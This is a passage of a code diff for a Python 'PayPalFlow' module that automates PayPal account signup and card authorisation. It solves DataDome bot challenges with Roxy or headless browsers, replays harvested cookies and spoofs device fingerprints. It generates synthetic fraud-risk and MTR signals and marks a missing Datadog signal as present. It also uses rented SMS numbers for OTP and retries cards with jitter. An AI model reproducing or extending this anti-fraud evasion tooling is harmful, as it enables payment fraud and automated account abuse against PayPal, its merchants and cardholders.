@@ -2,7 +2,6 @@
 
 Implements the complete protocol:
   Phase 0: DataDome verification + initial page load
-  Phase 1: Device fingerprint + Tealeaf + hCaptcha
   Phase 2: Create account (email submission → signup page)
   Phase 3: Fill signup form + submit (triggers 2FA SMS)
   Phase 4: OTP verification + final authorize mutation
@@ -16,8 +15,10 @@ import string
 import html as html_lib
 import subprocess
 import urllib.parse
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from pathlib import Path
-from typing import Any
+from typing import Any, Protocol, cast
+from uuid import uuid4
 from loguru import logger
 
 from paypal.models import (
@@ -42,7 +43,7 @@ from paypal.session import (
     sanitize_for_log,
     strict_browser_risk_enabled,
 )
-from paypal.mtr import extract_dfp_script_url, extract_mtr_config, ensure_mtr_config, send_mtr_signals
+from paypal.mtr import MTR_RUNTIME_PYTHON_GENERATED, extract_dfp_script_url, extract_mtr_config, ensure_mtr_config, send_mtr_signals
 from paypal.proxy import build_proxy_config, ProxyConfig, _load_dotenv_value as _load_proxy_dotenv_value
 from paypal.fingerprint import (
     ensure_runtime_profile,
@@ -56,8 +57,10 @@ from paypal.fingerprint import (
 )
 from paypal.tealeaf import send_tealeaf_data, TealeafSession
 from paypal.analytics import (
+    _DD_AUTHCHALLENGE_CONFIG,
     _DD_MODXO_CONFIG,
     _DD_WEASLEY_CONFIG,
+    _DD_HAGRID_CONFIG,
     send_xo_logger,
     send_analytics_ts,
     send_observability_emit,
@@ -79,12 +82,53 @@ from paypal.graphql import (
 )
 from config import (
     USER_AGENT,
+    FINGERPRINT_SOURCE,
     DATADOME_MODE,
     DATADOME_ROXY_WAIT_SECONDS,
     MTR_RUNTIME_MODE,
     RISK_ROXY_WAIT_SECONDS,
     RISK_SIGNALS_MODE,
 )
+
+
+_PHASE1_BROWSER_REQUIRED_SIGNALS = (
+    "fraudnet_p1",
+    "fraudnet_p2",
+    "fraudnet_w",
+    "identity_di_log",
+    "datadog_rum",
+)
+
+_MODXO_STATIC_ACTION_IDS = {
+    "fetch_device_fingerprint_action_id": "40119ea45de7135869f32892c6e0436cc9722b7775",
+    "show_create_account_action_id": "408cdbfcfb063642520b8dde73b124955e07000967",
+    "submit_public_credential_action_id": "403375d290e5845b191b7f22e6b940617e87334e8b",
+    "create_user_action_id": "60187d0e8cbc4131987e2c84c8e430dce698c2ace3",
+}
+
+
+class SmsActivationProtocol(Protocol):
+    activation_id: str
+    phone_number: str
+    provider_id: str
+    price: float
+    expires_at: float
+    reused: bool
+
+
+class SmsOtpProviderProtocol(Protocol):
+    max_attempts: int
+    wait_seconds: float
+
+    def reserve_number(self) -> SmsActivationProtocol: ...
+
+    def mark_sms_sent(self, activation: SmsActivationProtocol) -> None: ...
+
+    def wait_for_code(self, activation: SmsActivationProtocol, timeout_seconds: float | None = None) -> str | None: ...
+
+    def abandon(self, activation: SmsActivationProtocol, reason: str) -> None: ...
+
+    def register_confirmation_result(self, activation: SmsActivationProtocol, confirmed: bool) -> None: ...
 
 
 class PayPalFlow:
@@ -95,7 +139,7 @@ class PayPalFlow:
         card: CardInfo,
         address: BillingAddress,
         max_card_attempts: int = 5,
-        max_flow_attempts: int = 3,
+        max_flow_attempts: int = 1,
         max_authorize_attempts: int = 3,
         card_retry_delay_seconds: float = 6.0,
         card_retry_jitter_seconds: float = 2.0,
@@ -106,6 +150,7 @@ class PayPalFlow:
         datadome_mode: str | None = None,
         mtr_runtime: str | None = None,
         risk_signals_mode: str | None = None,
+        sms_provider: SmsOtpProviderProtocol | None = None,
     ):
         self.ba_token = ba_token
         self.user = user
@@ -126,6 +171,9 @@ class PayPalFlow:
         self.datadome_mode = datadome_mode
         self.mtr_runtime = mtr_runtime
         self.risk_signals_mode = risk_signals_mode
+        self.sms_provider = sms_provider
+        self._requested_risk_signals_mode = self._risk_signals_mode_raw()
+        self._roxy_runtime_disabled_reason = ""
         keep_roxy_browser = self._roxy_runtime_requested()
         self.state = SessionState(ba_token=ba_token)
         ensure_runtime_profile(
@@ -144,6 +192,20 @@ class PayPalFlow:
         self._billing_address_autocomplete_succeeded = False
         self._roxy_skipped_telemetry_families: set[str] = set()
         self._signup_billing_address_prepared = False
+        self._headless_session: Any | None = None
+        self._headless_optimized_session: Any | None = None
+
+        if keep_roxy_browser and self._fingerprint_runtime_requested_roxy():
+            profile_source = str(
+                (self.state.browser_profile or {}).get("fingerprint_source")
+                or getattr(self.state, "fingerprint_source", "")
+                or ""
+            ).lower()
+            roxy_browser = getattr(self.state, "roxy_browser", None) or {}
+            if profile_source != "roxy" and not roxy_browser.get("cdp_info"):
+                self._disable_roxy_runtime(
+                    "Roxy fingerprint fell back to program random; Roxy Local API/runtime is unavailable."
+                )
 
     @staticmethod
     def _raw_mode_value(explicit: str | None, env_names: tuple[str, ...], default: object) -> str:
@@ -166,7 +228,57 @@ class PayPalFlow:
             "roxy_auto",
         }
 
+    @staticmethod
+    def _roxy_runtime_fallback_enabled() -> bool:
+        raw = (
+            _load_proxy_dotenv_value("PAYPAL_ROXY_RUNTIME_FALLBACK")
+            or _load_proxy_dotenv_value("PAYPAL_ROXY_FALLBACK")
+            or "1"
+        ).strip().lower()
+        return raw not in {"0", "false", "no", "off", "strict", "disabled", "disable"}
+
+    @staticmethod
+    def _safe_error_text(error: object) -> str:
+        return str(sanitize_for_log({"error": str(error or "")})["error"])
+
+    def _fingerprint_runtime_requested_roxy(self) -> bool:
+        raw = self._raw_mode_value(
+            self.fingerprint_source,
+            ("PAYPAL_FINGERPRINT_SOURCE", "FINGERPRINT_SOURCE"),
+            "",
+        )
+        return self._mode_requests_roxy(raw)
+
+    def _disable_roxy_runtime(self, reason: object) -> None:
+        """Stop retrying Roxy during this flow and fall back to protocol paths."""
+        if not self._roxy_runtime_fallback_enabled():
+            return
+        reason_text = self._safe_error_text(reason or "Roxy runtime unavailable")
+        if not self._roxy_runtime_disabled_reason:
+            logger.warning(
+                "Roxy runtime unavailable; falling back to protocol/python runtime for this job: {}",
+                reason_text,
+            )
+        else:
+            logger.debug("Roxy runtime remains disabled for this job: {}", reason_text)
+        self._roxy_runtime_disabled_reason = reason_text
+        try:
+            setattr(self.state, "roxy_runtime_disabled_reason", reason_text)
+        except Exception:
+            pass
+        if self._datadome_mode_raw() == "roxy":
+            self.datadome_mode = "protocol"
+        if self._risk_signals_mode_raw() == "roxy":
+            self.risk_signals_mode = "protocol"
+        if self._mtr_runtime_raw() == "roxy":
+            self.mtr_runtime = "python_generated"
+
     def _roxy_runtime_requested(self) -> bool:
+        fingerprint_source = self._raw_mode_value(
+            self.fingerprint_source,
+            ("PAYPAL_FINGERPRINT_SOURCE", "FINGERPRINT_SOURCE"),
+            FINGERPRINT_SOURCE,
+        )
         datadome_mode = self._raw_mode_value(
             self.datadome_mode,
             ("PAYPAL_DATADOME_MODE", "DATADOME_MODE"),
@@ -184,10 +296,11 @@ class PayPalFlow:
         )
         return any(
             self._mode_requests_roxy(value)
-            for value in (datadome_mode, mtr_runtime, risk_mode)
+            for value in (fingerprint_source, datadome_mode, mtr_runtime, risk_mode)
         )
 
     def close(self):
+        self._cleanup_headless_session()
         self._cleanup_roxy_browser()
         self.session.close()
 
@@ -199,7 +312,7 @@ class PayPalFlow:
         return headers
 
     def _profile_user_agent(self) -> str:
-        return (self.state.browser_profile or {}).get("user_agent") or USER_AGENT
+        return str((self.state.browser_profile or {}).get("user_agent") or USER_AGENT)
 
     def _profile_country(self) -> str:
         return str((self.state.browser_profile or {}).get("country") or self.address.country or "BR")
@@ -294,7 +407,7 @@ class PayPalFlow:
             profile.get("language"),
             profile.get("timezone"),
             profile.get("timezone_offset_minutes"),
-            (profile.get("user_agent") or USER_AGENT)[:80],
+            str(profile.get("user_agent") or USER_AGENT)[:80],
             screen.get("width"),
             screen.get("height"),
             viewport.get("width"),
@@ -327,7 +440,7 @@ class PayPalFlow:
             self.state.datadome_clientid = client_id
             logger.info("DataDome client id captured for request header replay len={}", len(client_id))
 
-    def _datadome_mode(self) -> str:
+    def _datadome_mode_raw(self) -> str:
         raw = (
             self.datadome_mode
             or _load_proxy_dotenv_value("PAYPAL_DATADOME_MODE")
@@ -344,6 +457,13 @@ class PayPalFlow:
             "roxy": "roxy",
             "browser": "roxy",
             "real_browser": "roxy",
+            "headless": "headless",
+            "headless_optimized": "headless",
+            "optimized_headless": "headless",
+            "local_headless": "headless",
+            "playwright": "headless",
+            "local_playwright": "headless",
+            "prefer_headless": "headless",
             "auto": "auto",
             "off": "off",
             "none": "off",
@@ -352,6 +472,21 @@ class PayPalFlow:
             "0": "off",
         }
         return aliases.get(raw, "protocol")
+
+    def _datadome_mode(self) -> str:
+        mode = self._datadome_mode_raw()
+        if mode in {"roxy", "auto"} and self._roxy_runtime_disabled_reason:
+            return "protocol"
+        return mode
+
+    @staticmethod
+    def _headless_runtime_fallback_enabled() -> bool:
+        raw = (
+            _load_proxy_dotenv_value("PAYPAL_HEADLESS_RUNTIME_FALLBACK")
+            or _load_proxy_dotenv_value("PAYPAL_LOCAL_HEADLESS_FALLBACK")
+            or "1"
+        ).strip().lower()
+        return raw not in {"0", "false", "no", "off", "strict", "disabled", "disable"}
 
     @staticmethod
     def _datadome_roxy_wait_seconds() -> float:
@@ -362,6 +497,16 @@ class PayPalFlow:
             except ValueError:
                 pass
         return max(2.0, min(float(DATADOME_ROXY_WAIT_SECONDS), 60.0))
+
+    @staticmethod
+    def _datadome_headless_wait_seconds() -> float:
+        raw = _load_proxy_dotenv_value("PAYPAL_DATADOME_HEADLESS_WAIT_SECONDS")
+        if raw:
+            try:
+                return max(2.0, min(float(raw), 60.0))
+            except ValueError:
+                pass
+        return PayPalFlow._datadome_roxy_wait_seconds()
 
     def _ensure_roxy_browser_for_datadome(self) -> dict[str, object]:
         roxy_browser = getattr(self.state, "roxy_browser", None) or {}
@@ -394,11 +539,70 @@ class PayPalFlow:
         self.state.roxy_browser = runtime.get("roxy_browser", {})
         return self.state.roxy_browser
 
+    def _apply_datadome_browser_result(self, result: dict[str, Any], *, reason: str, runtime: str) -> bool:
+        solved = bool(result.get("ok"))
+        self.state.datadome_browser_result = {
+            "ok": solved,
+            "runtime": runtime,
+            "status": result.get("status"),
+            "url": result.get("url"),
+            "reason": reason,
+            "cookie_count": len(result.get("cookies") or []),
+            "datadome_present": bool(result.get("datadome")),
+            "clientid_present": bool(result.get("clientid")),
+            "blocked_by_datadome": bool(result.get("blocked_by_datadome")),
+            "intercept": result.get("intercept") or {},
+            "debug_log_path": result.get("debug_log_path") or "",
+        }
+        if result.get("clientid"):
+            self.state.datadome_clientid = str(result["clientid"])
+        if solved and result.get("cookies"):
+            self.session.import_browser_cookies(result["cookies"])
+        if solved and result.get("datadome"):
+            self.state.datadome_cookie = str(result["datadome"])
+            self.state.datadome_browser_solved = True
+            logger.info(
+                "DataDome solved through {} browser reason={} cookies={} datadome_len={}",
+                runtime,
+                reason,
+                len(result.get("cookies") or []),
+                len(str(result.get("datadome") or "")),
+            )
+            return True
+        logger.warning(
+            "{} DataDome run did not clear challenge reason={} status={} url={} datadome_present={} blocked_by_datadome={}",
+            runtime,
+            reason,
+            result.get("status"),
+            result.get("url"),
+            bool(result.get("datadome")),
+            bool(result.get("blocked_by_datadome")),
+        )
+        return False
+
     def _solve_datadome_with_roxy_browser(self, url: str, *, reason: str) -> bool:
         mode = self._datadome_mode()
         if mode in {"protocol", "off"}:
             return False
         try:
+            if mode == "headless":
+                if not self._headless_runtime_enabled():
+                    logger.warning("Local headless runtime is disabled; falling back to protocol mode for this job.")
+                    self.datadome_mode = "protocol"
+                    return False
+                headless_session = self._get_headless_session()
+                result = headless_session.solve_datadome(
+                    url,
+                    wait_seconds=self._datadome_headless_wait_seconds(),
+                )
+                solved = self._apply_datadome_browser_result(result, reason=reason, runtime="headless")
+                if not solved and self._headless_runtime_fallback_enabled():
+                    self.datadome_mode = "protocol"
+                    self._cleanup_headless_session()
+                    logger.warning(
+                        "Local headless DataDome did not clear challenge; falling back to protocol mode for this job."
+                    )
+                return solved
             from paypal.roxy_fingerprint import solve_datadome_with_roxy
 
             roxy_browser = self._ensure_roxy_browser_for_datadome()
@@ -408,54 +612,82 @@ class PayPalFlow:
                 cookies=self.session.export_cookies_for_browser(),
                 wait_seconds=self._datadome_roxy_wait_seconds(),
             )
-            self.state.datadome_browser_result = {
-                "ok": bool(result.get("ok")),
-                "status": result.get("status"),
-                "url": result.get("url"),
-                "reason": reason,
-                "cookie_count": len(result.get("cookies") or []),
-                "datadome_present": bool(result.get("datadome")),
-                "clientid_present": bool(result.get("clientid")),
-            }
-            if result.get("cookies"):
-                self.session.import_browser_cookies(result["cookies"])
-            if result.get("clientid"):
-                self.state.datadome_clientid = str(result["clientid"])
-            if result.get("datadome"):
-                self.state.datadome_cookie = str(result["datadome"])
-                self.state.datadome_browser_solved = True
-                logger.info(
-                    "DataDome solved through Roxy browser reason={} cookies={} datadome_len={}",
-                    reason,
-                    len(result.get("cookies") or []),
-                    len(str(result.get("datadome") or "")),
-                )
-                return True
-            logger.warning(
-                "Roxy DataDome run finished without datadome cookie reason={} status={} url={}",
-                reason,
-                result.get("status"),
-                result.get("url"),
-            )
-            return False
+            return self._apply_datadome_browser_result(result, reason=reason, runtime="roxy")
         except Exception as exc:
             self.state.datadome_browser_result = {
                 "ok": False,
+                "runtime": mode,
                 "reason": reason,
                 "error": str(exc),
             }
-            if mode == "roxy":
+            if mode == "headless":
+                if not self._headless_runtime_fallback_enabled():
+                    raise
+                self.datadome_mode = "protocol"
+                self._cleanup_headless_session()
+                logger.warning("Local headless DataDome failed; falling back to protocol method: {}", exc)
+                return False
+            if mode == "roxy" and not self._roxy_runtime_fallback_enabled():
                 raise
-            logger.warning("Roxy DataDome failed in auto mode; falling back to protocol method: {}", exc)
+            self._disable_roxy_runtime(exc)
+            logger.warning("Roxy DataDome failed; falling back to protocol method: {}", exc)
             return False
 
-    def _risk_signals_mode(self) -> str:
+    def _mtr_runtime_raw(self) -> str:
+        raw = (
+            self.mtr_runtime
+            or _load_proxy_dotenv_value("PAYPAL_MTR_RUNTIME")
+            or _load_proxy_dotenv_value("MTR_RUNTIME")
+            or str(MTR_RUNTIME_MODE or "")
+        ).strip().lower().replace("-", "_")
+        aliases = {
+            "": "python_generated",
+            "protocol": "python_generated",
+            "python": "python_generated",
+            "python_generated": "python_generated",
+            "synthetic": "python_generated",
+            "template": "python_generated",
+            "templates": "python_generated",
+            "roxy": "roxy",
+            "browser": "roxy",
+            "real_browser": "roxy",
+            "chrome": "roxy",
+            "chromium": "roxy",
+            "headless": "headless",
+            "headless_optimized": "headless",
+            "optimized_headless": "headless",
+            "local_headless": "headless",
+            "playwright": "headless",
+            "local_playwright": "headless",
+            "prefer_headless": "headless",
+            "auto": "auto",
+            "prefer_roxy": "auto",
+            "off": "off",
+            "none": "off",
+            "disabled": "off",
+            "disable": "off",
+            "0": "off",
+        }
+        return aliases.get(raw, "python_generated")
+
+    def _mtr_runtime_mode(self) -> str:
+        mode = self._mtr_runtime_raw()
+        if mode in {"roxy", "auto"} and self._roxy_runtime_disabled_reason:
+            return "python_generated"
+        return mode
+
+    def _risk_signals_mode_raw(self) -> str:
         raw = (
             self.risk_signals_mode
             or _load_proxy_dotenv_value("PAYPAL_RISK_SIGNALS_MODE")
             or _load_proxy_dotenv_value("RISK_SIGNALS_MODE")
             or str(RISK_SIGNALS_MODE or "")
         ).strip().lower().replace("-", "_")
+        return self._normalize_risk_signals_mode(raw)
+
+    @staticmethod
+    def _normalize_risk_signals_mode(raw: str) -> str:
+        raw = (raw or "").strip().lower().replace("-", "_")
         aliases = {
             "": "protocol",
             "protocol": "protocol",
@@ -468,6 +700,13 @@ class PayPalFlow:
             "real_browser": "roxy",
             "chrome": "roxy",
             "chromium": "roxy",
+            "headless": "headless",
+            "headless_optimized": "headless",
+            "optimized_headless": "headless",
+            "local_headless": "headless",
+            "playwright": "headless",
+            "local_playwright": "headless",
+            "prefer_headless": "headless",
             "auto": "auto",
             "prefer_roxy": "auto",
             "off": "off",
@@ -477,6 +716,24 @@ class PayPalFlow:
             "0": "off",
         }
         return aliases.get(raw, "protocol")
+
+    def _risk_signals_mode(self) -> str:
+        mode = self._risk_signals_mode_raw()
+        if mode in {"roxy", "auto"} and self._roxy_runtime_disabled_reason:
+            return "protocol"
+        return mode
+
+    def _signup_context_risk_mode(self) -> str:
+        current_mode = self._risk_signals_mode()
+        requested_mode = str(getattr(self, "_requested_risk_signals_mode", "") or "")
+        runtime_source = str(getattr(self.state, "risk_signals_runtime_source", "") or "")
+        if (
+            current_mode in {"roxy", "auto"}
+            or requested_mode in {"roxy", "auto"}
+            or runtime_source == "roxy"
+        ) and not self._roxy_runtime_disabled_reason:
+            return "roxy"
+        return "headless"
 
     @staticmethod
     def _risk_roxy_wait_seconds() -> float:
@@ -488,54 +745,227 @@ class PayPalFlow:
                 pass
         return max(3.0, min(float(RISK_ROXY_WAIT_SECONDS), 90.0))
 
-    def _send_phase1_risk_signals_with_roxy(self, page_url: str) -> bool:
-        mode = self._risk_signals_mode()
-        if mode in {"protocol", "off"}:
-            return False
-        try:
-            from paypal.roxy_fingerprint import run_phase1_risk_with_roxy_browser
+    @staticmethod
+    def _risk_headless_wait_seconds() -> float:
+        raw = _load_proxy_dotenv_value("PAYPAL_RISK_HEADLESS_WAIT_SECONDS")
+        if raw:
+            try:
+                return max(3.0, min(float(raw), 90.0))
+            except ValueError:
+                pass
+        return PayPalFlow._risk_roxy_wait_seconds()
 
-            roxy_browser = self._ensure_roxy_browser_for_datadome()
-            result = run_phase1_risk_with_roxy_browser(
-                roxy_browser,
-                page_url,
-                cookies=self.session.export_cookies_for_browser(),
-                wait_seconds=self._risk_roxy_wait_seconds(),
-                app_id="IWC_NEXT_CHECKOUT",
-                correlation_id=self.ba_token,
-            )
-            if result.get("cookies"):
-                self.session.import_browser_cookies(result["cookies"])
-            counts = result.get("counts") if isinstance(result.get("counts"), dict) else {}
-            self.state.risk_signals_runtime_source = "roxy"
-            self.state.risk_signals_browser_result = {
-                "ok": bool(result.get("ok")),
-                "status": result.get("status"),
-                "url": result.get("url"),
-                "observed": result.get("observed") or [],
-                "missing": result.get("missing") or [],
-                "counts": counts,
-                "cookie_count": len(result.get("cookies") or []),
-                "responses": result.get("responses") or [],
-                "injected_scripts": result.get("injected_scripts") or [],
-                "inject_errors": result.get("inject_errors") or [],
-            }
-            logger.info(
-                "Phase1 risk signals executed through Roxy browser observed={} missing={}",
-                ",".join(str(item) for item in (result.get("observed") or [])) or "<none>",
-                ",".join(str(item) for item in (result.get("missing") or [])) or "<none>",
-            )
-            return bool(result.get("ok"))
-        except Exception as exc:
-            self.state.risk_signals_runtime_source = "roxy_failed"
-            self.state.risk_signals_browser_result = {"ok": False, "error": str(exc)}
-            if mode == "roxy" or strict_browser_risk_enabled():
-                raise
-            logger.warning("Roxy Phase1 risk runtime failed in auto mode; falling back to protocol method: {}", exc)
+    @staticmethod
+    def _roxy_datadog_runtime_ready_from_result(result: dict[str, Any]) -> bool:
+        runtime = result.get("datadog_runtime") if isinstance(result.get("datadog_runtime"), dict) else {}
+        if not isinstance(runtime, dict) or runtime.get("error"):
             return False
+        if not (runtime.get("present") or runtime.get("hasDDRumGlobal")):
+            return False
+        keys = {str(item) for item in (runtime.get("keys") or [])}
+        has_operational_api = bool(
+            runtime.get("has_add_action")
+            or "addAction" in keys
+            or "startAction" in keys
+            or "startResource" in keys
+        )
+        has_context_api = bool(
+            "getInitConfiguration" in keys
+            or "getInternalContext" in keys
+            or runtime.get("hasInternalContext")
+            or runtime.get("initConfiguration")
+        )
+        return bool(has_operational_api and has_context_api)
+
+    @staticmethod
+    def _phase1_browser_required_missing_from_result(result: dict[str, Any]) -> list[str]:
+        raw_counts = result.get("counts")
+        counts = cast(dict[str, object], raw_counts) if isinstance(raw_counts, dict) else {}
+        raw_observed = result.get("observed")
+        observed_items = cast(list[object], raw_observed) if isinstance(raw_observed, list) else []
+        observed = {str(item) for item in observed_items if str(item)}
+        missing: list[str] = []
+        for family in _PHASE1_BROWSER_REQUIRED_SIGNALS:
+            raw_count = counts.get(family)
+            try:
+                count = int(raw_count) if isinstance(raw_count, (str, int, float)) else 0
+            except Exception:
+                count = 0
+            if count <= 0 and family not in observed:
+                missing.append(family)
+        return missing
+
+    @staticmethod
+    def _mark_phase1_browser_required_result(result: dict[str, Any]) -> list[str]:
+        missing = PayPalFlow._phase1_browser_required_missing_from_result(result)
+        result["required_signals"] = list(_PHASE1_BROWSER_REQUIRED_SIGNALS)
+        if missing:
+            raw_missing = result.get("missing")
+            missing_items = cast(list[object], raw_missing) if isinstance(raw_missing, list) else []
+            existing_missing = [str(item) for item in missing_items if str(item)]
+            merged_missing = list(dict.fromkeys([*existing_missing, *missing]))
+            result["missing"] = merged_missing
+            result["required_missing"] = list(missing)
+            result["ok"] = False
+        else:
+            raw_missing = result.get("missing")
+            missing_items = cast(list[object], raw_missing) if isinstance(raw_missing, list) else []
+            result["missing"] = [
+                str(item)
+                for item in missing_items
+                if str(item) and str(item) not in _PHASE1_BROWSER_REQUIRED_SIGNALS
+            ]
+            result["required_missing"] = []
+        return missing
+
+    def _normalize_phase1_roxy_datadog_runtime_result(self, result: dict[str, Any]) -> bool:
+        """Accept loaded DD_RUM runtime when the intake network batch is delayed.
+
+        Some Roxy/Chromium runs load PayPal's full Datadog SDK but do not flush
+        ``/api/v2/rum`` before the browser-risk wait times out.  The browser-side runtime is
+        still present and operational, so don't fail strict browser-risk checks on that
+        transport timing race.
+        """
+        if bool(result.get("ok")):
+            return not self._mark_phase1_browser_required_result(result)
+        browser_required_missing = self._phase1_browser_required_missing_from_result(result)
+        datadog_is_only_required_gap = browser_required_missing == ["datadog_rum"]
+        if not datadog_is_only_required_gap:
+            self._mark_phase1_browser_required_result(result)
+            return False
+        if not self._roxy_datadog_runtime_ready_from_result(result):
+            self._mark_phase1_browser_required_result(result)
+            return False
+
+        raw_counts = result.get("counts")
+        counts = dict(cast(dict[str, object], raw_counts)) if isinstance(raw_counts, dict) else {}
+        raw_datadog_count = counts.get("datadog_rum")
+        datadog_count = int(raw_datadog_count) if isinstance(raw_datadog_count, (str, int, float)) else 0
+        counts["datadog_rum"] = max(1, datadog_count)
+        result["counts"] = counts
+
+        raw_observed = result.get("observed")
+        observed_items = cast(list[object], raw_observed) if isinstance(raw_observed, list) else []
+        observed = [str(item) for item in observed_items if str(item)]
+        if "datadog_rum" not in observed:
+            observed.append("datadog_rum")
+        result["observed"] = observed
+        raw_missing = result.get("missing")
+        missing_items = cast(list[object], raw_missing) if isinstance(raw_missing, list) else []
+        existing_missing = [str(item) for item in missing_items if str(item)]
+        result["missing"] = [item for item in existing_missing if item != "datadog_rum"]
+        result["required_missing"] = []
+        result["datadog_runtime_fulfilled"] = True
+        result["datadog_runtime_fulfilled_reason"] = (
+            result.get("datadog_runtime_fulfilled_reason")
+            or "flow_layer_sdk_loaded_without_intake_capture"
+        )
+        raw_runtime_signals = result.get("runtime_signals")
+        runtime_signals = list(cast(list[object], raw_runtime_signals)) if isinstance(raw_runtime_signals, list) else []
+        runtime_signals.append(
+            {
+                "family": "datadog_rum",
+                "source": "DD_RUM_runtime",
+                "reason": result["datadog_runtime_fulfilled_reason"],
+            }
+        )
+        result["runtime_signals"] = runtime_signals
+        required_missing = self._mark_phase1_browser_required_result(result)
+        result["ok"] = not required_missing
+        logger.info(
+            "Roxy browser-risk Datadog intake request was not captured, but DD_RUM runtime is loaded; accepting datadog_rum runtime signal."
+        )
+        return not required_missing
+
+    def _headless_mtr_config_for_page(self, page_url: str) -> dict[str, object]:
+        ensure_mtr_config(self.state, page_url=page_url)
+        if not self.state.mtr_dfp_script_url:
+            self.state.mtr_dfp_script_url = "https://www.paypalobjects.com/v15170r-1d3n71ph1c4710n/dfp.js"
+        return {
+            "channel": self.state.mtr_channel,
+            "dfpChannel": self.state.mtr_channel,
+            "clientMetadataId": self.state.mtr_client_metadata_id,
+            "clientMetaDataId": self.state.mtr_client_metadata_id,
+            "apiKey": self.state.mtr_api_key,
+            "fppAPIKey": self.state.mtr_api_key,
+            "isQa": bool(self.state.mtr_is_qa),
+            "isQA": bool(self.state.mtr_is_qa),
+        }
+
+    def _apply_headless_mtr_result(self, result: dict[str, Any]) -> None:
+        self.state.mtr_runtime_source = "headless"
+        self.state.mtr_get_status = int(result.get("x0_status") or 0)
+        self.state.mtr_post_status = int(result.get("post_status") or 0)
+        self.state.mtr_request_id = str(result.get("requestId") or "")
+        self.state.mtr_sealed_result = str(result.get("sealedResult") or "")
+        self.state.mtr_visitor_token = str(result.get("visitorToken") or "")
+        self.state.mtr_completed = bool(self.state.mtr_request_id and self.state.mtr_sealed_result)
+        self.state.mtr_browser_result = {
+            "ok": self.state.mtr_completed,
+            "runtime": "headless",
+            "status": result.get("status"),
+            "url": result.get("url"),
+            "request_id_present": bool(self.state.mtr_request_id),
+            "sealed_result_present": bool(self.state.mtr_sealed_result),
+            "visitor_token_present": bool(self.state.mtr_visitor_token),
+            "debug_log_path": result.get("debug_log_path") or "",
+            "intercept": result.get("intercept") or {},
+        }
+
+    def _apply_headless_optimized_mtr_result(self, result: dict[str, Any]) -> None:
+        self._apply_headless_mtr_result(result)
+
+    def _store_headless_browser_result(self, result: dict[str, Any], *, browser_ok: bool, runtime: str) -> None:
+        raw_cookies = result.get("cookies")
+        result_cookies = cast(list[dict[str, Any]], raw_cookies) if isinstance(raw_cookies, list) else []
+        if result_cookies:
+            self.session.import_browser_cookies(result_cookies)
+        counts = result.get("counts") if isinstance(result.get("counts"), dict) else {}
+        observed = list(cast(list[object], result.get("observed"))) if isinstance(result.get("observed"), list) else []
+        missing = list(cast(list[object], result.get("missing"))) if isinstance(result.get("missing"), list) else []
+        self.state.risk_signals_runtime_source = runtime
+        self.state.risk_signals_browser_result = {
+            "ok": browser_ok,
+            "runtime": runtime,
+            "status": result.get("status"),
+            "url": result.get("url"),
+            "reason": result.get("reason") or "",
+            "observed": observed,
+            "observed_order": result.get("observed_order") or [],
+            "missing": missing,
+            "counts": counts,
+            "response_counts": result.get("response_counts") or {},
+            "cookie_count": len(result_cookies),
+            "requests": result.get("requests") or [],
+            "responses": result.get("responses") or [],
+            "request_failures": result.get("request_failures") or [],
+            "failed_requests": result.get("failed_requests") or result.get("request_failures") or [],
+            "injected_scripts": result.get("injected_scripts") or [],
+            "inject_errors": result.get("inject_errors") or [],
+            "datadog_runtime": result.get("datadog_runtime") or {},
+            "datadog_runtime_fulfilled": bool(result.get("datadog_runtime_fulfilled")),
+            "datadog_runtime_fulfilled_reason": result.get("datadog_runtime_fulfilled_reason") or "",
+            "datadog_probes": result.get("datadog_probes") or [],
+            "datadog_flushes": result.get("datadog_flushes") or [],
+            "runtime_signals": result.get("runtime_signals") or [],
+            "interaction_profile": result.get("interaction_profile") or "",
+            "interaction_summary": result.get("interaction_summary") or {},
+            "idle_interaction_summary": result.get("idle_interaction_summary") or {},
+            "interaction_error": result.get("interaction_error") or "",
+            "idle_interaction_error": result.get("idle_interaction_error") or "",
+            "required_signals": result.get("required_signals") or [],
+            "required_missing": result.get("required_missing") or [],
+            "reloads": result.get("reloads") or [],
+            "max_reloads": result.get("max_reloads"),
+            "blocked_requests": result.get("blocked_requests") or [],
+            "allowed_requests": result.get("allowed_requests") or [],
+            "learned_rules": result.get("learned_rules") or [],
+            "intercept": result.get("intercept") or {},
+            "debug_log_path": result.get("debug_log_path") or "",
+        }
 
     def _send_signup_context_risk_signals_with_roxy(self, signup_url: str, token: str) -> bool:
-        mode = self._risk_signals_mode()
+        mode = self._signup_context_risk_mode()
         if mode not in {"roxy", "auto"} and not self._roxy_risk_runtime_active():
             return False
         try:
@@ -552,26 +982,54 @@ class PayPalFlow:
             )
             if result.get("cookies"):
                 self.session.import_browser_cookies(result["cookies"])
+            browser_ok = self._normalize_phase1_roxy_datadog_runtime_result(result)
             counts = result.get("counts") if isinstance(result.get("counts"), dict) else {}
             signup_context_result = {
-                "ok": bool(result.get("ok")),
+                "ok": browser_ok,
+                "runtime": "roxy",
                 "status": result.get("status"),
                 "url": result.get("url"),
+                "reason": result.get("reason") or "",
                 "app_id": "CHECKOUTUINODEWEB_ONBOARDING_LITE",
                 "correlation_id": token,
                 "observed": result.get("observed") or [],
+                "observed_order": result.get("observed_order") or [],
                 "missing": result.get("missing") or [],
                 "counts": counts,
+                "response_counts": result.get("response_counts") or {},
                 "cookie_count": len(result.get("cookies") or []),
+                "requests": result.get("requests") or [],
                 "responses": result.get("responses") or [],
+                "request_failures": result.get("request_failures") or [],
+                "failed_requests": result.get("failed_requests") or result.get("request_failures") or [],
                 "injected_scripts": result.get("injected_scripts") or [],
                 "inject_errors": result.get("inject_errors") or [],
+                "datadog_runtime": result.get("datadog_runtime") or {},
+                "datadog_runtime_fulfilled": bool(result.get("datadog_runtime_fulfilled")),
+                "datadog_runtime_fulfilled_reason": result.get("datadog_runtime_fulfilled_reason") or "",
+                "datadog_probes": result.get("datadog_probes") or [],
+                "datadog_flushes": result.get("datadog_flushes") or [],
+                "runtime_signals": result.get("runtime_signals") or [],
+                "interaction_profile": result.get("interaction_profile") or "",
+                "interaction_summary": result.get("interaction_summary") or {},
+                "idle_interaction_summary": result.get("idle_interaction_summary") or {},
+                "interaction_error": result.get("interaction_error") or "",
+                "idle_interaction_error": result.get("idle_interaction_error") or "",
+                "required_signals": result.get("required_signals") or [],
+                "required_missing": result.get("required_missing") or [],
+                "reloads": result.get("reloads") or [],
+                "max_reloads": result.get("max_reloads"),
+                "blocked_requests": result.get("blocked_requests") or [],
+                "allowed_requests": result.get("allowed_requests") or [],
+                "learned_rules": result.get("learned_rules") or [],
+                "intercept": result.get("intercept") or {},
